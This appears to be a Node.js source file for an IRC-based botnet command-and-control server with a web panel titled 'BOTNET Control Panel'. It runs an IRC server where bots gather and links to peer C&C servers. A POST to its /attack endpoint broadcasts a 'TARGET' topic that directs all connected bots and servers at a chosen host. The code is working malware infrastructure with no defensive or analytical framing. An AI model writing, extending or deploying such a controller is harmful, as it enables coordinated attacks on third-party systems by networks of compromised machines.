var IrcServer = require('ircdjs').Server;
var Morgan = require('morgan');
var BodyParser = require("body-parser");
var Storage = require('node-storage');
var Express = require('express');
var DateFormat = require('dateformat');
var IrcClient = require('slate-irc');
var Net = require('net');
var util = require('util');

var ircHostname = process.env.IRC_HOSTNAME || 'localhost';
var ircPort = process.env.IRC_PORT || 6667;
var webPort = process.env.WEB_PORT || 8080;

var localDB = new Storage('info-' + ircPort);

var serversListTag = 'servers_list';
var serverList = localDB.get(serversListTag);

if (serverList === undefined)
{
    serverList = [];
    localDB.put(serversListTag, serverList);
}

var startDate = Date.now();

var app = Express();

app.set('view engine', 'ejs');
app.use(Morgan('dev'))
app.use('/bower_components',  Express.static(__dirname + '/bower_components'));
app.use('/public',  Express.static(__dirname + '/public'));
app.use(BodyParser.urlencoded({ extended: true }));
app.use(BodyParser.json());

var myIrcServer = new IrcServer();
var myIrcConnections = {};

myIrcServer.showLog = true;
myIrcServer.config = {
    'network': 'ircn',
    'hostname': ircHostname,
    'serverName': 'H:' + ircHostname + 'P:' + ircPort,
    'port': ircPort,
    'linkPort': 7777,
    'whoWasLimit': 10000,
    'token': 1,
    'opers': {},
    'links': {},
    "maxNickLength": 40,
    "opers": {
        "Paulo": {}
    },
    //'serverPassword': '$2a$10$T1UJYlinVUGHqfInKSZQz./CHrYIVVqbDO3N1fRNEUvFvSEcshNdC'
};
var botsTopic = "Nada";

myIrcServer.start(function(err) {
    if(err)
        return console.log(err);
    console.log('Irc server listening at ' + ircPort);
    setInterval(function() {
        var serversChannel = myIrcServer.channels.registered['#servers'];

        if(serversChannel !== undefined)
        {
            var botChannel = myIrcServer.channels.registered['#bots'];
            //var serverChannel = myIrcServer.channels.registered['#servers'];

            if(botChannel !== undefined)
            {
                botChannel.topic = serversChannel.topic;
                botChannel.send('Paulo', 'TOPIC', botChannel.name, ':' + botsTopic);
            }
        }
    }, 1000)
});

console.log('Server list: ' + serverList);

serverList.forEach(function(server) {
    Connect(server);
});

app.get('/', function(req, res) {
    var uptime = Date.now() - startDate;
    var localBotList = [];
    var botChannel = myIrcServer.channels.registered['#bots'];

    if(botChannel !== undefined)
    {
        var users = botChannel.users;
        users.forEach(function(user) {
            localBotList.push(user);
        });
    }

    var connections = [];
    var online = 0;
    var offline = 0;

    serverList.forEach(function(server) {
        connections.push(myIrcConnections[server]);
        if(myIrcConnections[server].client !== undefined)
        {
            online++;
        }
        else
        {
            offline++;
        }
    });

    return res.render('index', {
        'title': 'BOTNET Control Panel',
        'uptime': msToTime(uptime),
        'irc_hostname': ircHostname,
        'irc_port': ircPort,
        'bot_list': localBotList,
        'server_list': connections,
        'servers_on': online,
        'servers_off': offline,
    });
});

app.post('/ccserver/add', function(req, res) {
    var serverAddress = req.body.address;

    console.log('Adding '+ serverAddress);

    if(serverAddress !== undefined)
    {
        serverList.push(serverAddress);
        localDB.put(serversListTag, serverList);
        Connect(serverAddress);
    }

    return res.redirect('/');
});

app.post('/attack', function(req, res) {
    var target = req.body.target;
    console.log('Attack ' + target);

    //var serversChannel = myIrcServer.channels.registered['#servers'];
    //var serverChannel = myIrcServer.channels.registered['#servers'];

    target = "TARGET " + target;
    botsTopic = target;
    //if(serversChannel !== undefined)
    //{
    //    serversChannel.topic = target;
    //    serversChannel.send('CC-SERVER', 'TOPIC', serversChannel.name, ':' + serversChannel.topic);
    //}

    serverList.forEach(function(server) {
        var client = myIrcConnections[server].client;
        if(client != undefined)
        {
            client.topic('#servers', target);
        }
    });
    //if(serverChannel !== undefined)
    //{
    //    serverChannel.topic = target;
    //    serverChannel.send('CC-SERVER', 'TOPIC', serverChannel.name, ':' + serverChannel.topic);
    //}

    return res.redirect('/');
});

app.post('/ccserver/remove', function(req, res) {
    var serverAddress = req.body.address;

    console.log('Removing ' + req.body.address);

    var index = serverList.indexOf(serverAddress);

    if (index > -1) {
        serverList.splice(index, 1);
        localDB.put(serversListTag, serverList);
        if(myIrcConnections[serverAddress].client !== undefined)
            myIrcConnections[serverAddress].client.quit();
        delete myIrcConnections[serverAddress];
    }

    return res.redirect('/');
});

app.listen(webPort);
console.log('Web server running at ' + webPort);

function msToTime(s) {
  var ms = s % 1000;
  s = (s - ms) / 1000;
  var secs = s % 60;
  s = (s - secs) / 60;
  var mins = s % 60;
  var hrs = (s - mins) / 60;

  return hrs + ':' + mins + ':' + secs;
}

function Connect(server)
{
    var tokens = server.split(":");
    var address = tokens[0];
    var port = tokens[1];

    var connection = {
        'id': server,
        'hostname': address,
        'port': port
    };

    myIrcConnections[server] = connection;
    console.log('Connecting to ' + address + ' at ' + port + '.');

    var stream = Net.connect({
        'port': port,
        'host': address
    });

    stream.on('error', function() {
        var that = connection;
        return function(err) {
            console.log('Error when connecting to ' + that.hostname + ' at ' + that.port + '.');
            that['error'] = err;
            that.client = undefined;
            console.log('trying again in 5 seconds...');
            setTimeout(function(){ Connect(connection.id); }, 5000);
        };
    }());

    stream.on('connect', function() {
        var thatStream = stream;
        var thatConn = connection;
        return function() {
            console.log('connected');
            var client = IrcClient(thatStream);

            client.nick('CCServer_' + ircHostname + '_' + ircPort);
            client.user('Paulo', 'cc-server@' + ircHostname + ':' + ircPort);

            client.join('#servers');

            client.on('topic', function(data) {
                console.log(util.inspect(data));
                botsTopic = data.topic;
            });

            thatConn['client'] = client;
        };
    }());
}